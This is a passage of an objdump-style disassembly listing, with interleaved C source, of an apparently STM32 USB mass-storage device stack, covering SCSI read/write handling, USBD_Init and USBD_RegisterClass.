 800ab14:	b086      	sub	sp, #24
 800ab16:	af00      	add	r7, sp, #0
 800ab18:	60f8      	str	r0, [r7, #12]
 800ab1a:	607a      	str	r2, [r7, #4]
 800ab1c:	603b      	str	r3, [r7, #0]
 800ab1e:	460b      	mov	r3, r1
 800ab20:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab22:	68fb      	ldr	r3, [r7, #12]
 800ab24:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab28:	68fb      	ldr	r3, [r7, #12]
 800ab2a:	32b0      	adds	r2, #176	; 0xb0
 800ab2c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab30:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab32:	697b      	ldr	r3, [r7, #20]
 800ab34:	2b00      	cmp	r3, #0
 800ab36:	d102      	bne.n	800ab3e <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ab38:	f04f 33ff 	mov.w	r3, #4294967295
 800ab3c:	e012      	b.n	800ab64 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ab3e:	687a      	ldr	r2, [r7, #4]
 800ab40:	683b      	ldr	r3, [r7, #0]
 800ab42:	441a      	add	r2, r3
 800ab44:	697b      	ldr	r3, [r7, #20]
 800ab46:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab4a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ab4c:	429a      	cmp	r2, r3
 800ab4e:	d908      	bls.n	800ab62 <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ab50:	7af9      	ldrb	r1, [r7, #11]
 800ab52:	2321      	movs	r3, #33	; 0x21
 800ab54:	2205      	movs	r2, #5
 800ab56:	68f8      	ldr	r0, [r7, #12]
 800ab58:	f7ff fb62 	bl	800a220 <SCSI_SenseCode>
    return -1;
 800ab5c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab60:	e000      	b.n	800ab64 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800ab62:	2300      	movs	r3, #0
}
 800ab64:	4618      	mov	r0, r3
 800ab66:	3718      	adds	r7, #24
 800ab68:	46bd      	mov	sp, r7
 800ab6a:	bd80      	pop	{r7, pc}

0800ab6c <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ab6c:	b590      	push	{r4, r7, lr}
 800ab6e:	b085      	sub	sp, #20
 800ab70:	af00      	add	r7, sp, #0
 800ab72:	6078      	str	r0, [r7, #4]
 800ab74:	460b      	mov	r3, r1
 800ab76:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab78:	687b      	ldr	r3, [r7, #4]
 800ab7a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab7e:	687b      	ldr	r3, [r7, #4]
 800ab80:	32b0      	adds	r2, #176	; 0xb0
 800ab82:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab86:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ab88:	68fb      	ldr	r3, [r7, #12]
 800ab8a:	2b00      	cmp	r3, #0
 800ab8c:	d102      	bne.n	800ab94 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800ab8e:	f04f 33ff 	mov.w	r3, #4294967295
 800ab92:	e07b      	b.n	800ac8c <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ab94:	68fb      	ldr	r3, [r7, #12]
 800ab96:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab9a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ab9c:	68fa      	ldr	r2, [r7, #12]
 800ab9e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aba2:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aba6:	fb02 f303 	mul.w	r3, r2, r3
 800abaa:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800abac:	68bb      	ldr	r3, [r7, #8]
 800abae:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800abb2:	bf28      	it	cs
 800abb4:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800abb8:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800abba:	687b      	ldr	r3, [r7, #4]
 800abbc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800abc0:	687a      	ldr	r2, [r7, #4]
 800abc2:	33b0      	adds	r3, #176	; 0xb0
 800abc4:	009b      	lsls	r3, r3, #2
 800abc6:	4413      	add	r3, r2
 800abc8:	685b      	ldr	r3, [r3, #4]
 800abca:	691c      	ldr	r4, [r3, #16]
 800abcc:	68fb      	ldr	r3, [r7, #12]
 800abce:	f103 0110 	add.w	r1, r3, #16
 800abd2:	68fb      	ldr	r3, [r7, #12]
 800abd4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abd8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800abda:	68fb      	ldr	r3, [r7, #12]
 800abdc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abe0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800abe4:	4618      	mov	r0, r3
 800abe6:	68bb      	ldr	r3, [r7, #8]
 800abe8:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800abec:	b29b      	uxth	r3, r3
 800abee:	78f8      	ldrb	r0, [r7, #3]
 800abf0:	47a0      	blx	r4
 800abf2:	4603      	mov	r3, r0
 800abf4:	2b00      	cmp	r3, #0
 800abf6:	da08      	bge.n	800ac0a <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800abf8:	78f9      	ldrb	r1, [r7, #3]
 800abfa:	2311      	movs	r3, #17
 800abfc:	2204      	movs	r2, #4
 800abfe:	6878      	ldr	r0, [r7, #4]
 800ac00:	f7ff fb0e 	bl	800a220 <SCSI_SenseCode>
    return -1;
 800ac04:	f04f 33ff 	mov.w	r3, #4294967295
 800ac08:	e040      	b.n	800ac8c <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ac0a:	4b22      	ldr	r3, [pc, #136]	; (800ac94 <SCSI_ProcessRead+0x128>)
 800ac0c:	7819      	ldrb	r1, [r3, #0]
 800ac0e:	68fb      	ldr	r3, [r7, #12]
 800ac10:	f103 0210 	add.w	r2, r3, #16
 800ac14:	68bb      	ldr	r3, [r7, #8]
 800ac16:	6878      	ldr	r0, [r7, #4]
 800ac18:	f002 f8f4 	bl	800ce04 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ac1c:	68fb      	ldr	r3, [r7, #12]
 800ac1e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac22:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac24:	68fb      	ldr	r3, [r7, #12]
 800ac26:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac2a:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac2e:	4619      	mov	r1, r3
 800ac30:	68bb      	ldr	r3, [r7, #8]
 800ac32:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac36:	4413      	add	r3, r2
 800ac38:	68fa      	ldr	r2, [r7, #12]
 800ac3a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac3e:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ac40:	68fb      	ldr	r3, [r7, #12]
 800ac42:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac46:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ac48:	68fb      	ldr	r3, [r7, #12]
 800ac4a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac4e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac52:	4619      	mov	r1, r3
 800ac54:	68bb      	ldr	r3, [r7, #8]
 800ac56:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac5a:	1ad3      	subs	r3, r2, r3
 800ac5c:	68fa      	ldr	r2, [r7, #12]
 800ac5e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac62:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800ac64:	68fb      	ldr	r3, [r7, #12]
 800ac66:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac6a:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ac6c:	68bb      	ldr	r3, [r7, #8]
 800ac6e:	1ad3      	subs	r3, r2, r3
 800ac70:	68fa      	ldr	r2, [r7, #12]
 800ac72:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac76:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ac78:	68fb      	ldr	r3, [r7, #12]
 800ac7a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac7e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac80:	2b00      	cmp	r3, #0
 800ac82:	d102      	bne.n	800ac8a <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ac84:	68fb      	ldr	r3, [r7, #12]
 800ac86:	2203      	movs	r2, #3
 800ac88:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800ac8a:	2300      	movs	r3, #0
}
 800ac8c:	4618      	mov	r0, r3
 800ac8e:	3714      	adds	r7, #20
 800ac90:	46bd      	mov	sp, r7
 800ac92:	bd90      	pop	{r4, r7, pc}
 800ac94:	2000010a 	.word	0x2000010a

0800ac98 <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ac98:	b590      	push	{r4, r7, lr}
 800ac9a:	b085      	sub	sp, #20
 800ac9c:	af00      	add	r7, sp, #0
 800ac9e:	6078      	str	r0, [r7, #4]
 800aca0:	460b      	mov	r3, r1
 800aca2:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aca4:	687b      	ldr	r3, [r7, #4]
 800aca6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800acaa:	687b      	ldr	r3, [r7, #4]
 800acac:	32b0      	adds	r2, #176	; 0xb0
 800acae:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800acb2:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800acb4:	68fb      	ldr	r3, [r7, #12]
 800acb6:	2b00      	cmp	r3, #0
 800acb8:	d102      	bne.n	800acc0 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800acba:	f04f 33ff 	mov.w	r3, #4294967295
 800acbe:	e08e      	b.n	800adde <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800acc0:	68fb      	ldr	r3, [r7, #12]
 800acc2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acc6:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800acc8:	68fa      	ldr	r2, [r7, #12]
 800acca:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acce:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800acd2:	fb02 f303 	mul.w	r3, r2, r3
 800acd6:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800acd8:	68bb      	ldr	r3, [r7, #8]
 800acda:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800acde:	bf28      	it	cs
 800ace0:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ace4:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ace6:	687b      	ldr	r3, [r7, #4]
 800ace8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800acec:	687a      	ldr	r2, [r7, #4]
 800acee:	33b0      	adds	r3, #176	; 0xb0
 800acf0:	009b      	lsls	r3, r3, #2
 800acf2:	4413      	add	r3, r2
 800acf4:	685b      	ldr	r3, [r3, #4]
 800acf6:	695c      	ldr	r4, [r3, #20]
 800acf8:	68fb      	ldr	r3, [r7, #12]
 800acfa:	f103 0110 	add.w	r1, r3, #16
 800acfe:	68fb      	ldr	r3, [r7, #12]
 800ad00:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad04:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800ad06:	68fb      	ldr	r3, [r7, #12]
 800ad08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad0c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad10:	4618      	mov	r0, r3
 800ad12:	68bb      	ldr	r3, [r7, #8]
 800ad14:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ad18:	b29b      	uxth	r3, r3
 800ad1a:	78f8      	ldrb	r0, [r7, #3]
 800ad1c:	47a0      	blx	r4
 800ad1e:	4603      	mov	r3, r0
 800ad20:	2b00      	cmp	r3, #0
 800ad22:	da08      	bge.n	800ad36 <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800ad24:	78f9      	ldrb	r1, [r7, #3]
 800ad26:	2303      	movs	r3, #3
 800ad28:	2204      	movs	r2, #4
 800ad2a:	6878      	ldr	r0, [r7, #4]
 800ad2c:	f7ff fa78 	bl	800a220 <SCSI_SenseCode>
    return -1;
 800ad30:	f04f 33ff 	mov.w	r3, #4294967295
 800ad34:	e053      	b.n	800adde <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ad36:	68fb      	ldr	r3, [r7, #12]
 800ad38:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad3c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ad3e:	68fb      	ldr	r3, [r7, #12]
 800ad40:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad44:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad48:	4619      	mov	r1, r3
 800ad4a:	68bb      	ldr	r3, [r7, #8]
 800ad4c:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad50:	4413      	add	r3, r2
 800ad52:	68fa      	ldr	r2, [r7, #12]
 800ad54:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad58:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ad5a:	68fb      	ldr	r3, [r7, #12]
 800ad5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad60:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ad62:	68fb      	ldr	r3, [r7, #12]
 800ad64:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad68:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad6c:	4619      	mov	r1, r3
 800ad6e:	68bb      	ldr	r3, [r7, #8]
 800ad70:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad74:	1ad3      	subs	r3, r2, r3
 800ad76:	68fa      	ldr	r2, [r7, #12]
 800ad78:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad7c:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800ad7e:	68fb      	ldr	r3, [r7, #12]
 800ad80:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad84:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ad86:	68bb      	ldr	r3, [r7, #8]
 800ad88:	1ad3      	subs	r3, r2, r3
 800ad8a:	68fa      	ldr	r2, [r7, #12]
 800ad8c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad90:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ad92:	68fb      	ldr	r3, [r7, #12]
 800ad94:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad98:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad9a:	2b00      	cmp	r3, #0
 800ad9c:	d104      	bne.n	800ada8 <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800ad9e:	2100      	movs	r1, #0
 800ada0:	6878      	ldr	r0, [r7, #4]
 800ada2:	f7fe fc53 	bl	800964c <MSC_BOT_SendCSW>
 800ada6:	e019      	b.n	800addc <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800ada8:	68fb      	ldr	r3, [r7, #12]
 800adaa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adae:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800adb0:	68fa      	ldr	r2, [r7, #12]
 800adb2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800adb6:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800adba:	fb02 f303 	mul.w	r3, r2, r3
 800adbe:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800adc2:	bf28      	it	cs
 800adc4:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800adc8:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800adca:	4b07      	ldr	r3, [pc, #28]	; (800ade8 <SCSI_ProcessWrite+0x150>)
 800adcc:	7819      	ldrb	r1, [r3, #0]
 800adce:	68fb      	ldr	r3, [r7, #12]
 800add0:	f103 0210 	add.w	r2, r3, #16
 800add4:	68bb      	ldr	r3, [r7, #8]
 800add6:	6878      	ldr	r0, [r7, #4]
 800add8:	f002 f84c 	bl	800ce74 <USBD_LL_PrepareReceive>
  }

  return 0;
 800addc:	2300      	movs	r3, #0
}
 800adde:	4618      	mov	r0, r3
 800ade0:	3714      	adds	r7, #20
 800ade2:	46bd      	mov	sp, r7
 800ade4:	bd90      	pop	{r4, r7, pc}
 800ade6:	bf00      	nop
 800ade8:	2000010b 	.word	0x2000010b

0800adec <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800adec:	b480      	push	{r7}
 800adee:	b087      	sub	sp, #28
 800adf0:	af00      	add	r7, sp, #0
 800adf2:	60f8      	str	r0, [r7, #12]
 800adf4:	60b9      	str	r1, [r7, #8]
 800adf6:	4613      	mov	r3, r2
 800adf8:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800adfa:	88fb      	ldrh	r3, [r7, #6]
 800adfc:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800adfe:	68fb      	ldr	r3, [r7, #12]
 800ae00:	2b00      	cmp	r3, #0
 800ae02:	d102      	bne.n	800ae0a <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800ae04:	f04f 33ff 	mov.w	r3, #4294967295
 800ae08:	e013      	b.n	800ae32 <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800ae0a:	8afa      	ldrh	r2, [r7, #22]
 800ae0c:	68fb      	ldr	r3, [r7, #12]
 800ae0e:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800ae10:	e00b      	b.n	800ae2a <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800ae12:	8afb      	ldrh	r3, [r7, #22]
 800ae14:	3b01      	subs	r3, #1
 800ae16:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800ae18:	8afb      	ldrh	r3, [r7, #22]
 800ae1a:	68ba      	ldr	r2, [r7, #8]
 800ae1c:	441a      	add	r2, r3
 800ae1e:	8afb      	ldrh	r3, [r7, #22]
 800ae20:	7811      	ldrb	r1, [r2, #0]
 800ae22:	68fa      	ldr	r2, [r7, #12]
 800ae24:	4413      	add	r3, r2
 800ae26:	460a      	mov	r2, r1
 800ae28:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800ae2a:	8afb      	ldrh	r3, [r7, #22]
 800ae2c:	2b00      	cmp	r3, #0
 800ae2e:	d1f0      	bne.n	800ae12 <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800ae30:	2300      	movs	r3, #0
}
 800ae32:	4618      	mov	r0, r3
 800ae34:	371c      	adds	r7, #28
 800ae36:	46bd      	mov	sp, r7
 800ae38:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ae3c:	4770      	bx	lr

0800ae3e <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800ae3e:	b580      	push	{r7, lr}
 800ae40:	b086      	sub	sp, #24
 800ae42:	af00      	add	r7, sp, #0
 800ae44:	60f8      	str	r0, [r7, #12]
 800ae46:	60b9      	str	r1, [r7, #8]
 800ae48:	4613      	mov	r3, r2
 800ae4a:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800ae4c:	68fb      	ldr	r3, [r7, #12]
 800ae4e:	2b00      	cmp	r3, #0
 800ae50:	d101      	bne.n	800ae56 <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ae52:	2303      	movs	r3, #3
 800ae54:	e01f      	b.n	800ae96 <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800ae56:	68fb      	ldr	r3, [r7, #12]
 800ae58:	2200      	movs	r2, #0
 800ae5a:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800ae5e:	68fb      	ldr	r3, [r7, #12]
 800ae60:	2200      	movs	r2, #0
 800ae62:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800ae66:	68fb      	ldr	r3, [r7, #12]
 800ae68:	2200      	movs	r2, #0
 800ae6a:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800ae6e:	68bb      	ldr	r3, [r7, #8]
 800ae70:	2b00      	cmp	r3, #0
 800ae72:	d003      	beq.n	800ae7c <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800ae74:	68fb      	ldr	r3, [r7, #12]
 800ae76:	68ba      	ldr	r2, [r7, #8]
 800ae78:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800ae7c:	68fb      	ldr	r3, [r7, #12]
 800ae7e:	2201      	movs	r2, #1
 800ae80:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800ae84:	68fb      	ldr	r3, [r7, #12]
 800ae86:	79fa      	ldrb	r2, [r7, #7]
 800ae88:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800ae8a:	68f8      	ldr	r0, [r7, #12]
 800ae8c:	f001 fdb6 	bl	800c9fc <USBD_LL_Init>
 800ae90:	4603      	mov	r3, r0
 800ae92:	75fb      	strb	r3, [r7, #23]

  return ret;
 800ae94:	7dfb      	ldrb	r3, [r7, #23]
}
 800ae96:	4618      	mov	r0, r3
 800ae98:	3718      	adds	r7, #24
 800ae9a:	46bd      	mov	sp, r7
 800ae9c:	bd80      	pop	{r7, pc}

0800ae9e <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800ae9e:	b580      	push	{r7, lr}
 800aea0:	b084      	sub	sp, #16
 800aea2:	af00      	add	r7, sp, #0
 800aea4:	6078      	str	r0, [r7, #4]
 800aea6:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800aea8:	2300      	movs	r3, #0
 800aeaa:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800aeac:	683b      	ldr	r3, [r7, #0]
 800aeae:	2b00      	cmp	r3, #0
 800aeb0:	d101      	bne.n	800aeb6 <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800aeb2:	2303      	movs	r3, #3
 800aeb4:	e025      	b.n	800af02 <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800aeb6:	687b      	ldr	r3, [r7, #4]
 800aeb8:	683a      	ldr	r2, [r7, #0]
 800aeba:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800aebe:	687b      	ldr	r3, [r7, #4]
 800aec0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aec4:	687b      	ldr	r3, [r7, #4]
 800aec6:	32ae      	adds	r2, #174	; 0xae
 800aec8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aecc:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aece:	2b00      	cmp	r3, #0
 800aed0:	d00f      	beq.n	800aef2 <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800aed2:	687b      	ldr	r3, [r7, #4]
 800aed4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aed8:	687b      	ldr	r3, [r7, #4]
 800aeda:	32ae      	adds	r2, #174	; 0xae
 800aedc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aee0:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aee2:	f107 020e 	add.w	r2, r7, #14
 800aee6:	4610      	mov	r0, r2
 800aee8:	4798      	blx	r3
 800aeea:	4602      	mov	r2, r0
 800aeec:	687b      	ldr	r3, [r7, #4]
 800aeee:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800aef2:	687b      	ldr	r3, [r7, #4]
 800aef4:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800aef8:	1c5a      	adds	r2, r3, #1
 800aefa:	687b      	ldr	r3, [r7, #4]
 800aefc:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800af00:	2300      	movs	r3, #0
}
 800af02:	4618      	mov	r0, r3
 800af04:	3710      	adds	r7, #16
 800af06:	46bd      	mov	sp, r7
 800af08:	bd80      	pop	{r7, pc}

0800af0a <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800af0a:	b580      	push	{r7, lr}
 800af0c:	b082      	sub	sp, #8
